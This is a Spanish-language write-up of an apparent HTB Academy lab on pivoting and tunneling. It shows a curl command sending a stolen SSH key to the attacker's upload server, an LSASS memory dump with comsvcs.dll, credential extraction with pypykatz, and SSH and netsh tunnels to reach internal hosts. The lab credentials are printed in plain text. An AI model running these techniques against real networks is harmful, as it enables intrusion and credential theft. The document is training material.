# Pivoting, tunneling and port forwarding - lab

## Enunciado - IP: 10.129.229.129 

A team member started a Penetration Test against the Inlanefreight environment but was moved to another project at the last minute. Luckily for us, they left a web shell in place for us to get back into the network so we can pick up where they left off. We need to leverage the web shell to continue enumerating the hosts, identifying common services, and using those services/protocols to pivot into the internal networks of Inlanefreight. Our detailed objectives are below:

Objectives
- Start from external (Pwnbox or your own VM) and access the first system via the web shell left in place.
- Use the web shell access to enumerate and pivot to an internal host.
- Continue enumeration and pivoting until you reach the Inlanefreight Domain Controller and capture the associated flag.
- Use any data, credentials, scripts, or other information within the environment to enable your pivoting attempts.
- Grab any/all flags that can be found.k


## Preguntas

**Once on the webserver, enumerate the host for credentials that can be used to start a pivot or tunnel to another host in the network. In what user's directory can you find the credentials? Submit the name of the user as the answer.**


- Nos dan una webshell a la que podemos acceder desde el navegador. 

- Con `netcat` nos creamos una shell interactiva

- Encontramos un archivo `id_rsa` en `/home/webadmin`. Nos llevamos su contenido, escribiendo `python -m uploadserver` en nuestra pwnbox 

    ```bash
    curl -X POST http://10.10.14.137:8000/upload -F 'files=@/home/webadmin/id_rsa' 
    ```

- Una vez conectados, si escribimos `whoami` vemos que somos `webadmin`, por lo que podemos responder a la primera Preguntas

**Submit the credentials found in the user's home directory. (Format: user:password)**

- En la carpeta de `/home/webadmin` hay un  archivo llamado `for-admin-eyes-only`, que nos da credenciales: 

    ```plaintext
    mlefay:Plain Human work!
    ```

**Enumerate the internal network and discover another active host. Submit the IP address of that host as the answer.**

- Comprobamos con `ip a` que tenemos una interfaz de red con dirección `172.16.5.15/16`

- Probamos a hacer un ping sweep

    ```bash
    for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
    ```

    Encontrando la dirección IP 172.16.5.35 abierta. Cambiamos nuestra variable de entorno `$target` a este valor. Quedan así las variables: 
    - `$target`: 172.16.5.35
    - `$pivot`: 10.129.229.129 (otra interfaz en 172.16.5.15)

**Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.**

- Creamos un túnel socks con la clave id_rsa obtenida

    ```bash
    ssh -NfD 9050 webadmin@$pivot -i id_rsa   
    ```

- Escaneamos el host

    ```bash
    proxychains nmap -v -Pn -sT --max-rate 1000 --min-parallelism 10 -p 1-1000 $target
    ```

    encontrando los siguientes puertos abiertos:

    ```textplain
    PORT    STATE SERVICE
    22/tcp  open  ssh
    135/tcp open  msrpc
    139/tcp open  netbios-ssn
    445/tcp open  microsoft-ds
    ``` 
### Servicio smb

- Tratamos de enumerar los recursos compartidos

    ```bash
    proxychains nxc smb $target -u 'mlefay' -p 'Plain Human work!' --shares
    ```

    pero esto no arroja información, más allá de que estas credenciales son válidas para `sbm`. Probamos con `smbmap`

    ```bash
    proxychains smbmap -H $target -u 'mlefay' -p 'Plain Human work!'
    ```

    encontrando los siguientes recursos comaprtidos: 

    ```textplain
        Disk    Permissions Comment
        ----    ----------- -------
        ADMIN$  NO ACCESS   Remote Admin
        C$      NO ACCESS   Default share1
        IPC$    READ ONLY   Remote IPC
        Users   READ ONLY
    ```
    No encontramos demasiada información

### RDP - 172.16.5.35

- Con las credenciales obtenidas, `mlefay:Plain Human work!`, tenemos acceso al sistema
    
    ```bash
    ssh -NfL 33389:$target:3389 webadmin@$pivot -i compartido/id_rsa
    ```

    ```bash
    xfreerdp /v:localhost /u:mlefay /p:'Plain Human work!' /drive:Shared,/home/an0nio/htb/academy/pivoting/lab/compartido /port:33389
    ```

por lo que podemos responder a la siguiente pregunta 

**Use the information you gathered to pivot to the discovered host. Submit the contents of C:\Flag.txt as the answer.**

**In previous pentests against Inlanefreight, we have seen that they have a bad habit of utilizing accounts with services in a way that exposes the users credentials and the network as a whole. What user is vulnerable?**

- Dentro de la sesión RDP podemos dumpear `lsass`

    ```powershell
    Get-Process lsass 
    # Encontramos que el proceso es el 680
    rundll32 C:\windows\system32\comsvcs.dll, MiniDump 680 C:\lsass.dmp full
    ```


- Dado que hemos creado una sesión con una carpeta compartida, movemos el archivo dumpeado a la carpeta compartida y utilizamos `pypypkatz` para obtener información:

    ```bash
    pypykatz lsa minidump lsass.dmp > pypykatz.txt
    ```

    Encontramos usuarios escribiendo 

    ```bash
    cat pypykatz.txt| grep user
    ```

    Hay un usuario fuera de lo común, `vprank`, (es la respuesta a la pregunta anterior)

    ```bash
    cat pypykatz.txt| grep vfrank -C 3 | grep -i pass
    ```

    encontrando que tiene credenciales en texto plano: `vfrank:Imply wet Unmasked!`

- Comprobamos que esta máquina tiene dos interfaces de red: `172.16.5.35/24` y `172.16.6.35/24`. Hacemos ping sweep sobre la segunda interfaz: 

    ```cmd
    for /L %i in (1,1,254) do @ping -n 1 -w 100 172.16.6.%i | find "Reply" >nul && echo 172.16.6.%i
    ```

    Encontrando abierta la máquina `172.16.6.25`. Hacemos un escaneo de puertos escribiendo lo siguiente: 

    ```powershell
    $target = "172.16.6.25"
    $ports = Get-Content "ports.txt"
    $ports | % { if ((Test-NetConnection -ComputerName $target -Port $_).TcpTestSucceeded) { $_ } }
    ```
    
    Encontramos abiertos los siguientes puertos: 

    ```textplain
    Port 3389 is open
    Port 445 is open
    Port 139 is open
    Port 135 is open
    ```

### RDP - 172.16.6.25

- Dado que `$target` está comprometido, convertimos a `$target` en `$pivot2`, quedando
    - `$target`: 172.16.6.25
    - `$pivot`: 10.129.229.129 (otra interfaz en 172.16.5.15)
    - `$pivot2`: 172.16.5.35 (otra interfaz en 172.16.6.35)

- Debemos crear un túnel para poder conectarnos por RDP a `$target`. En nuestra pwnbox escribimos

    ```bash
    ssh -NfL 13389:$pivot2:13389 webadmin@$pivot -i compartido/id_rsa
    ```

- Y en la máquina `$pivot2` redirigimos el tráfico del siguiente modo:

    ```powershell
    netsh interface portproxy add v4tov4 listenport=13389 listenaddress=0.0.0.0 connectport=3389 connectaddress=172.16.6.35
    ```

- Desde nuestra pwnbox podemos conectarnos ahora a $target

    ```bash
    xfreerdp /v:localhost /u:vfrank /p:'Imply wet Unmasked!' /drive:Shared,/home/an0nio/htb/academy/pivoting/lab/compartido /port:13389
    ```

Esto ya nos permite responder a las últimas dos preguntas: 

**For your next hop enumerate the networks and then utilize a common remote access solution to pivot. Submit the C:\Flag.txt located on the workstation.** 

Se accede sin ningún problema por RDP

**Submit the contents of C:\Flag.txt located on the Domain Controller.**

Si vamos a mi equipo, hay una carpeta compartida por el DC, en donde está la flag